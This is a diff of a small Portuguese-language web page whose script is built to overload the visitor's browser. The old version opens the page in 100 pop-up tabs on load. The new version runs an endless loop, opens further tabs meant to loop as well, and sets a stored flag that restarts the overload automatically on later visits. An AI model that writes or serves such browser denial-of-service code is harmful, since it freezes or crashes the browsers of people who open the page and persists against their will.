@@ -1,23 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Abrindo o site...</title>
+    <title>Sobrecarregar Navegador</title>
     <script>
-        function reopenSite() {
-            const currentUrl = window.location.href; // Obtém o URL atual
-            for (let i = 0; i < 100; i++) { // Define o número de vezes que o site será aberto
-                window.open(currentUrl, "_blank"); // Reabre o mesmo site em uma nova aba
+        // Função para sobrecarregar o navegador
+        function overload() {
+            while (true) {
+                console.log("Sobrecarregando...");
             }
         }
 
-        // Executa a função quando a página carrega
-        window.onload = reopenSite;
+        // Função para abrir novas abas e sobrecarregar
+        function openAndOverload() {
+            for (let i = 0; i < 5; i++) {
+                let newWindow = window.open('', '_blank');
+                newWindow.document.write('<!DOCTYPE html><html><head><title>Sobrecarregando</title></head><body><h1>Esta aba está sobrecarregando o navegador.</h1></body></html>');
+                newWindow.document.close();
+                newWindow.onload = function() {
+                    overload();
+                };
+            }
+        }
+
+        // Verifica se a sobrecarga já foi iniciada
+        function checkOverloadStatus() {
+            if (localStorage.getItem('overloadStarted') === 'true') {
+                overload(); // Começa a sobrecarga automaticamente
+                openAndOverload(); // Abre 5 novas abas com o script de sobrecarga
+            }
+        }
+
+        // Aviso que ocorrerá a sobrecarga após 5 segundos
+        function startOverload() {
+            alert("A sobrecarga começará em 5 segundos.");
+            setTimeout(function() {
+                localStorage.setItem('overloadStarted', 'true'); // Marca que a sobrecarga foi iniciada
+                overload(); // Começa a sobrecarga na aba atual
+                openAndOverload(); // Abre 5 novas abas com o script de sobrecarga
+            }, 5000); // Atraso de 5 segundos
+        }
+
+        // Verifica o status de sobrecarga ao carregar a página
+        window.onload = checkOverloadStatus;
     </script>
 </head>
 <body>
-    <h1>Abrindo o site...</h1>
-    <p>A página será aberta. Por favor, permita a opção sempre pop-ups.</p>
+    <h1>Sobrecarregar Navegador</h1>
+    <p>O navegador será sobrecarregado em 5 segundos. Aguarde...</p>
+    <button onclick="startOverload()">Iniciar Sobrecarga</button>
 </body>
 </html>
